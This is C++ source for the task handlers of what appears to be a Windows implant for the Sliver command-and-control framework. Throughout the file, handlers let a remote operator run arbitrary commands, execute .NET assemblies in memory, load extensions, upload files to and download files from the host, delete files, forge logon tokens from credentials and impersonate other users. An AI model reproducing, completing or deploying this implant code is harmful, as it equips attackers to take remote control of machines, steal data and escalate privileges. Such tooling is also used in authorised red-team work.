#include <windows.h>
#include "Handlers.h"
#include "Handlers_Utils.h"
#include "constants.h"
#include <filesystem>
#include "taskRunner.h"
#include "extensions.h"
#include "filesystem.h"
#include <string>
#include <gzip/compress.hpp>
#include <gzip/decompress.hpp>
#include "Token.h"
#include "Utils.h"
#include "processes.h"

using namespace std;
using namespace taskrunner;

namespace handlers {
	map<int, handler> systemHandlers = {
		{sliverpb::MsgPwdReq,static_cast<handler>(pwdHandler)},
		{sliverpb::MsgInvokeInProcExecuteAssemblyReq,static_cast<handler>(executeAssemblyHandler)},
		{sliverpb::MsgRegisterExtensionReq,static_cast<handler>(registerExtensionHandler)},
		{sliverpb::MsgCallExtensionReq,static_cast<handler>(callExtensionHandler)},
		{sliverpb::MsgListExtensionsReq,static_cast<handler>(listExtensionHandler)},
		{sliverpb::MsgCdReq,static_cast<handler>(cdHandler)},
		{sliverpb::MsgLsReq,static_cast<handler>(lsHandler)},
		{sliverpb::MsgUploadReq,static_cast<handler>(uploadHandler)},
		{sliverpb::MsgDownloadReq,static_cast<handler>(downloadHandler)},
		{sliverpb::MsgMkdirReq,static_cast<handler>(mkdirHandler)},
		{sliverpb::MsgRmReq,static_cast<handler>(rmHandler)},
		{sliverpb::MsgMakeTokenReq,static_cast<handler>(makeTokenHandler)},
		{sliverpb::MsgRevToSelfReq,static_cast<handler>(revToSelfHandler)},
		{sliverpb::MsgExecuteWindowsReq,static_cast<handler>(executeHandler)},
		{sliverpb::MsgExecuteReq,static_cast<handler>(executeHandler)},
		{sliverpb::MsgImpersonateReq,static_cast<handler>(impersonateHandler)},
		{sliverpb::MsgPsReq,static_cast<handler>(psHandler)}
	};
	
	map<int, handler>& getSystemHandlers() {
		return systemHandlers;
	}

	sliverpb::Envelope psHandler(int64_t taskID, string data) {
		sliverpb::PsReq req;
		sliverpb::Ps resp;

		req.ParseFromString(data);
		try {
			auto procs = processes::ps();
			for (auto it = procs.begin();it != procs.end();++it) {
				auto proc = resp.add_processes();
				proc->set_architecture(it->arch);
				proc->set_executable(it->exe);
				proc->set_owner(it->owner);
				proc->set_pid(it->pid);
				proc->set_ppid(it->ppid);
				proc->set_sessionid(it->sessionID);
			}
		}
		catch (exception& e) {
			auto common_resp = new sliverpb::Response();
			common_resp->set_err(std::format("execute triggered exception: {}", e.what()));
			resp.set_allocated_response(common_resp);
		}
		return wrapResponse(taskID, resp);
	}

	sliverpb::Envelope executeHandler(int64_t taskID, string data) {
		sliverpb::ExecuteWindowsReq req;
		sliverpb::Execute resp;

		req.ParseFromString(data);
		string cmd;
		cmd.append(req.path());
		cmd.append(" ");
		for (auto it = req.args().begin();it != req.args().end();++it)
			cmd.append(it->c_str());
		try {
			auto output = taskrunner::execute(cmd, req.output(),req.ppid(),req.usetoken());
			resp.set_stdout_pb(output);
		}
		catch (exception& e) {
			auto common_resp = new sliverpb::Response();
			common_resp->set_err(std::format("execute triggered exception: {}",e.what()));
			resp.set_allocated_response(common_resp);
		}
		return wrapResponse(taskID, resp);
	}

	sliverpb::Envelope pwdHandler(int64_t taskID,string data) {
		sliverpb::PwdReq req;
		req.ParseFromString(data);
		auto path = FS::pwd();
		sliverpb::Pwd resp;
		resp.set_path(path);
		return wrapResponse(taskID, resp);	
	}
	sliverpb::Envelope lsHandler(int64_t taskID, string data) {
		sliverpb::LsReq req;
		req.ParseFromString(data);
		//sliverpb::Envelope resp;
		auto resp = FS::ls(req.path(),false);
		return wrapResponse(taskID, resp);
	}
	sliverpb::Envelope cdHandler(int64_t taskID, string data) {
		sliverpb::CdReq req;
		sliverpb::Pwd resp;
		req.ParseFromString(data);
		auto ret = FS::cd(req.path());
		resp.set_path(ret);
		return wrapResponse(taskID, resp);
	}
	sliverpb::Envelope uploadHandler(int64_t taskID, string data) {
		sliverpb::UploadReq req;
		sliverpb::Upload resp;
		req.ParseFromString(data);
		string filebytes;
		if (req.encoder().compare("gzip") == 0) {
			filebytes = gzip::decompress(req.data().c_str(), req.data().size());
		}
		else {
			filebytes = req.data();
		}
		auto ret = FS::write(filesystem::absolute(req.path()).string(), filebytes);
		if (!ret) {
			auto common_resp = new sliverpb::Response();
			common_resp->set_err("upload failed");
			resp.set_allocated_response(common_resp);
		}
		resp.set_path(filesystem::absolute(req.path()).string());
		return wrapResponse(taskID, resp);
	}
	sliverpb::Envelope downloadHandler(int64_t taskID, string data) {
		sliverpb::DownloadReq req;
		sliverpb::Download resp;
		req.ParseFromString(data);
		string filedata;
		resp.set_path(filesystem::absolute(req.path()).string());
		try {
			filedata = FS::read(filesystem::absolute(req.path()).string());
		}
		catch (exception& e) {
			auto common_resp = new sliverpb::Response();
			common_resp->set_err(e.what());
			resp.set_allocated_response(common_resp);
			resp.set_exists(false);
			resp.set_unreadablefiles(1);
			resp.set_readfiles(0);
			return wrapResponse(taskID, resp);
		}
		auto gzipdata = gzip::compress(filedata.c_str(), filedata.size());
		resp.set_data(gzipdata);
		resp.set_encoder(std::string{ "gzip" });
		resp.set_exists(true);
		resp.set_readfiles(1);
		resp.set_unreadablefiles(0);
		return wrapResponse(taskID, resp);
	}
	sliverpb::Envelope rmHandler(int64_t taskID, string data) {
		sliverpb::RmReq req;
		sliverpb::Rm resp;
		req.ParseFromString(data);
		error_code err;
		auto res = FS::remove(filesystem::absolute(req.path()).string(), err, req.recursive());
		resp.set_path(filesystem::absolute(req.path()).string());
		if (!res) {
			sliverpb::Response* common_resp = new sliverpb::Response();
			common_resp->set_err(std::format("Error value:{}\nError message: {}\n",err.value(), err.message()));
			resp.set_allocated_response(common_resp);
		}
		return wrapResponse(taskID, resp);
	}
	sliverpb::Envelope mkdirHandler(int64_t taskID, string data) {
		sliverpb::MkdirReq req;
		sliverpb::Mkdir resp;
		req.ParseFromString(data);
		error_code err;
		auto res = FS::mkdir(filesystem::absolute(req.path()).string(), err);
		resp.set_path(filesystem::absolute(req.path()).string());
		if (!res) {
			sliverpb::Response* common_resp = new sliverpb::Response();
			common_resp->set_err(std::format("Error value:{}\nError message: {}\n", err.value(), err.message()));
			resp.set_allocated_response(common_resp);
		}
		return wrapResponse(taskID, resp);
	}
	sliverpb::Envelope makeTokenHandler(int64_t taskID, string data) {
		sliverpb::MakeTokenReq req;
		sliverpb::MakeToken resp;
		req.ParseFromString(data);
		auto res = token::makeToken(req.domain(), req.username(), req.password(), req.logontype());
		if (!res) {
			auto common_resp = new sliverpb::Response();
			common_resp->set_err(string{ "logonUserA returned false" });
			resp.set_allocated_response(common_resp);
		}
		return wrapResponse(taskID, resp);
	}
	sliverpb::Envelope revToSelfHandler(int64_t taskID, string data) {
		sliverpb::RevToSelfReq req;
		sliverpb::RevToSelf resp;
		req.ParseFromString(data);
		token::revertToken();
		return wrapResponse(taskID, resp);
	}
	sliverpb::Envelope executeAssemblyHandler(int64_t taskID, string data) {
		sliverpb::InvokeInProcExecuteAssemblyReq req;
		req.ParseFromString(data);
		string params{ "" };
		for (auto it = req.arguments().begin(); it != req.arguments().end();++it) {
			params.append(it->c_str());
			params.append(" ");
		}
		while(params.length() != 0 && params[params.length()-1] == ' ')
			params.pop_back();
		auto output = ExecuteAssembly(req.data(),params, true, true);
		sliverpb::ExecuteAssembly resp;
		resp.set_output(output);
		return wrapResponse(taskID, resp);
	}
	sliverpb::Envelope registerExtensionHandler(int64_t taskID, string data) {
		sliverpb::RegisterExtensionReq req;
		req.ParseFromString(data);
		sliverpb::RegisterExtension resp;
		sliverpb::Response* common_resp = new sliverpb::Response();
		resp.set_allocated_response(common_resp);
		extensions::addExtension(req.data(), req.name(), req.os(), req.init());
		return wrapResponse(taskID, resp);
	}
	sliverpb::Envelope callExtensionHandler(int64_t taskID, string data) {
		sliverpb::CallExtensionReq req;
		req.ParseFromString(data);
		sliverpb::CallExtension resp;
		
		auto out = extensions::runExtension(req.name(), req.export_(), req.args());
		if (!out.empty()) {
			resp.set_output(out);
		}
		else {
			sliverpb::Response* common_resp = new sliverpb::Response();
			common_resp->set_err(string{ "[-] blank output" });
			resp.set_allocated_response(common_resp);
		}
		return wrapResponse(taskID, resp);
	}
	sliverpb::Envelope listExtensionHandler(int64_t taskID, string data) {
		sliverpb::ListExtensionsReq req;
		req.ParseFromString(data);
		sliverpb::ListExtensions resp;

		auto out = extensions::listExtensions();
		for (auto it = out.begin();it != out.end();++it) {
			resp.add_names(it->c_str());
		}
		return wrapResponse(taskID, resp);
	}

	sliverpb::Envelope impersonateHandler(int64_t taskID, string data) {
		sliverpb::ImpersonateReq req;
		req.ParseFromString(data);
		sliverpb::Impersonate resp;
		bool res = FALSE;
		try {
			if (utils::is_number(req.username()))
				res = token::Impersonate(stoi(req.username()));
			else
				res = token::Impersonate(req.username());
			if (res == false) {
				sliverpb::Response* common_resp = new sliverpb::Response();
				common_resp->set_err(string{ "[-] Failed to impersonate. No suitable token found" });
				resp.set_allocated_response(common_resp);
			}
		}
		catch (exception e) {
			sliverpb::Response* common_resp = new sliverpb::Response();
			common_resp->set_err(string{ "[-] Impersonate thrown following exception:\n" }+e.what());
			resp.set_allocated_response(common_resp);
		}
		return wrapResponse(taskID, resp);
	}
}